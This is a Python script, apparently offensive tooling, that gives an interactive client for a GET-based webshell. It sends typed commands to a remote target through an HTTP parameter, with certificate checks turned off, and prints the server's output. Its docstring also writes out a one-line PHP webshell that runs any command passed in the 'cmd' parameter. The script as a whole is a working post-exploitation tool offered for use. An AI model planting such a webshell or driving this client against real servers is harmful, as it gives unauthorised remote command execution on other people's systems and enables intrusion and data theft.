#!/usr/bin/env python3
"""
Webshell Handler Mini

A minimal interactive client for communicating with a simple HTTP-based GET webshell.
The script sends commands to a remote webshell through a specified HTTP parameter
and prints the server response.

Usage:
    python3 webshell_handler_mini.py <webshell_url> <command_parameter>

Example:
    python3 webshell_handler_mini.py http://target/webshell.php cmd

The script assumes the webshell executes system commands passed through the
specified parameter, e.g.:
    GET http://target/shell.php?cmd=id

Example of webshell.php file:
    <?php system($_GET['cmd']); ?>

Type 'exit' to terminate the session.
"""

import os
import sys
import urllib3
from requests import Session, Response, RequestException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore


def print_welcome_message(url: str, param: str):
    """Display startup information."""
    print ("\nWebshell Handler Mini Started\n"
         f"Target URL: {url}\n"
         f"Command parameter: {param}\n"
         f"Type exit to terminate.\n")


def run_command(session: Session, url: str, param: str, cmd: str) -> str:
    """Send a command to the remote webshell and return the response."""
    r: Response = session.get(url, params={param: cmd}, timeout=20, verify=False)
    return r.text.strip()


def handle_webshell(session: Session, url: str, param: str):
    """Main interactive loop for sending commands to the webshell."""
    print_welcome_message(url, param)

    while True:
        try:
            cmd: str = input("\nwebshell> ").strip()

            if cmd == "":
                continue

            if cmd == "exit":
                break

            if cmd in ["clear", "cls"]:
                os.system("clear")
                continue

            output: str = run_command(session, url, param, cmd)
            print(f"\n{output}")

        except KeyboardInterrupt:
            print("\nKeyboardInterrupt: Session terminated by user.")
            break

        except RequestException as e:
            print(f"\nRequestException: {e}")

        except Exception as e:
            print(f"\nException: {e}")


def main() -> None:
    """Entry point of the script."""
    if len(sys.argv) != 3:
        print(f"Webshell Handler Mini\n"
              f"Usage: {sys.argv[0]} <webshell_url> <cmd_param>")
        sys.exit(1)
    url: str = sys.argv[1]
    param: str = sys.argv[2]
    session: Session = Session()
    handle_webshell(session, url, param)


if __name__ == "__main__":
    main()
